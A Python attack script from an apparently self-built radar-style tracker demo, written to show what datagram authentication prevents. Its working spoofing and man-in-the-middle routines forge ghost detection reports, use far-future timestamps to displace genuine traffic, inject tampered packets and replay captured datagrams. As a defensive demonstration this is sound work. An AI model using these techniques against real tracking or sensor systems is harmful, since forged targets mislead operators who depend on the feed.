#!/usr/bin/env python3
"""Attacks a running Vigil tracker, to show what datagram authentication stops.

Two attackers, matching the threat model in docs/ICD.md (Security):

  spoof   Off-path. Doesn't see any traffic; just sends forged detection reports for a
          ghost target flying at the sensor. They carry a far-future timestamp, so an
          unprotected tracker also throws away every genuine report after them as "out of
          order": the ghost takes over the picture.

  mitm    On-path. Sits between the simulator and the tracker and forwards every datagram,
          but first sends a tampered copy with a ghost detection added, and replays each
          genuine datagram again a few seconds later.

Try each against both modes of the demo:

  ./demo.sh --insecure                          # then: tools/attacker.py spoof
  ./demo.sh                                     # then: tools/attacker.py spoof
  ./demo.sh --port 50002                        # sim -> attacker; then: tools/attacker.py mitm
  ./demo.sh --insecure --port 50002             # then: tools/attacker.py mitm

With authentication on, the scope doesn't change, and the tracker log (build/demo/
tracker.log) counts every rejection by reason. Only for use against your own Vigil setup.
"""

import argparse
import math
import random
import socket
import struct
import threading
import time

MAGIC = 0x56474C31  # "VGL1": a plain Vigil message
AUTH_MAGIC = 0x56474C53  # "VGLS": an authenticated envelope
MSG_DETECTION_REPORT = 1
HEADER = struct.Struct("<IHHIHHQ")  # magic, version, type, seq, source, count, timestamp
DETECTION = struct.Struct("<dd")
AUTH_HEADER_SIZE = 24
AUTH_TAG_SIZE = 16


def detection_report(seq, timestamp_ns, points):
    out = HEADER.pack(MAGIC, 1, MSG_DETECTION_REPORT, seq, 1, len(points), timestamp_ns)
    return out + b"".join(DETECTION.pack(x, y) for x, y in points)


def ghost_position(t_s):
    """A ghost 20 km out on a bearing of 045, closing on the sensor at 250 m/s."""
    r = max(20_000 - 250 * t_s, 500)
    return r * math.sin(math.radians(45)), r * math.cos(math.radians(45))


def spoof(args):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    seq = random.randrange(1_000_000, 2_000_000_000)
    # ~11.6 days ahead of any real scan, so genuine reports now look out of order.
    t0_ns = 1_000_000 * 10**9
    print(f"spoof: sending a forged ghost target to {args.host}:{args.port} at 1 Hz (Ctrl-C to stop)")
    sent = 0
    try:
        while True:
            x, y = ghost_position(sent)
            noisy = (x + random.gauss(0, 25), y + random.gauss(0, 25))
            sock.sendto(detection_report(seq + sent, t0_ns + sent * 10**9, [noisy]), (args.host, args.port))
            sent += 1
            print(f"\rspoof: {sent} forged reports sent; ghost at ({x/1000:6.1f}, {y/1000:6.1f}) km", end="")
            time.sleep(1.0)
    except KeyboardInterrupt:
        print()


def add_ghost(datagram, t_s):
    """Adds a ghost detection to a detection report, sealed or not, without the key."""
    sealed = datagram[:4] == struct.pack("<I", AUTH_MAGIC)
    message = datagram[AUTH_HEADER_SIZE:-AUTH_TAG_SIZE] if sealed else datagram
    if len(message) < HEADER.size:
        return None
    magic, version, kind, seq, source, count, timestamp = HEADER.unpack_from(message)
    if magic != MAGIC or kind != MSG_DETECTION_REPORT:
        return None
    ghost = DETECTION.pack(*ghost_position(t_s))
    tampered = HEADER.pack(magic, version, kind, seq, source, count + 1, timestamp)
    tampered += message[HEADER.size:] + ghost
    if sealed:
        # Without the key the best an attacker can do is keep the old tag (or make one up).
        return datagram[:AUTH_HEADER_SIZE] + tampered + datagram[-AUTH_TAG_SIZE:]
    return tampered


def mitm(args):
    inbound = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    inbound.bind(("0.0.0.0", args.listen))
    out = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    target = (args.host, args.port)
    print(f"mitm: relaying udp/{args.listen} -> {target[0]}:{target[1]}, tampering and replaying (Ctrl-C to stop)")
    start = time.monotonic()
    counts = {"forwarded": 0, "tampered": 0, "replayed": 0}

    def replay_later(datagram):
        time.sleep(args.replay_delay)
        out.sendto(datagram, target)
        counts["replayed"] += 1

    try:
        while True:
            datagram, _ = inbound.recvfrom(65_536)
            # The tampered copy goes first, to beat the genuine one to the tracker. (Sent
            # after it, the replay window would reject it before even checking the tag.)
            tampered = add_ghost(datagram, time.monotonic() - start)
            if tampered is not None:
                out.sendto(tampered, target)
                counts["tampered"] += 1
            out.sendto(datagram, target)
            counts["forwarded"] += 1
            threading.Thread(target=replay_later, args=(datagram,), daemon=True).start()
            print("\rmitm: " + ", ".join(f"{v} {k}" for k, v in counts.items()), end="")
    except KeyboardInterrupt:
        print()


def main():
    parser = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    sub = parser.add_subparsers(dest="mode", required=True)
    p = sub.add_parser("spoof", help="off-path: forge a ghost target")
    p.add_argument("--host", default="127.0.0.1")
    p.add_argument("--port", type=int, default=50_000, help="tracker port (default 50000)")
    p = sub.add_parser("mitm", help="on-path: tamper with and replay real traffic")
    p.add_argument("--listen", type=int, default=50_002, help="port the simulator sends to (default 50002)")
    p.add_argument("--host", default="127.0.0.1")
    p.add_argument("--port", type=int, default=50_000, help="tracker port (default 50000)")
    p.add_argument("--replay-delay", type=float, default=3.0, help="seconds before replaying (default 3)")
    args = parser.parse_args()
    {"spoof": spoof, "mitm": mitm}[args.mode](args)


if __name__ == "__main__":
    main()
